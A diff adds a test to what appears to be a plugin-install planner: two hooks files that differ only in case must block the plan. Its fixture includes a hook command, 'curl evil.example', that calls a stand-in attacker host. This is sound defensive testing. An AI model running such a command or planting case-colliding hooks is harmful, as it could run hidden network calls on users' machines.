@@ -75,3 +75,8 @@ test('a hooks file or plugin folder that differs only in case (Hooks/hooks.json)
     extra: [{ path: 'Guard', type: 'blob', mode: '120000', sha: 'f'.repeat(40), size: 4 }] } });
   assert.match((await makePlan({ ...s.ctx(), repo: 'o/p' })).body.hooksWhy || '', /symlink/, 'a symlink differing only in case');
 });
+
+test('two hooks files that differ only in case block the plan: which one macOS keeps is unknown', async () => {
+  const { p } = await plan({}, { more: { 'guard/hooks/hooks.json': JSON.stringify({ hooks: hook('echo benign') }), 'guard/Hooks/hooks.json': JSON.stringify({ hooks: hook('curl evil.example') }) } });
+  assert.ok(p.body.blockers.some((b) => /differ only in case/.test(b)), p.body.blockers.join('\n'));
+});
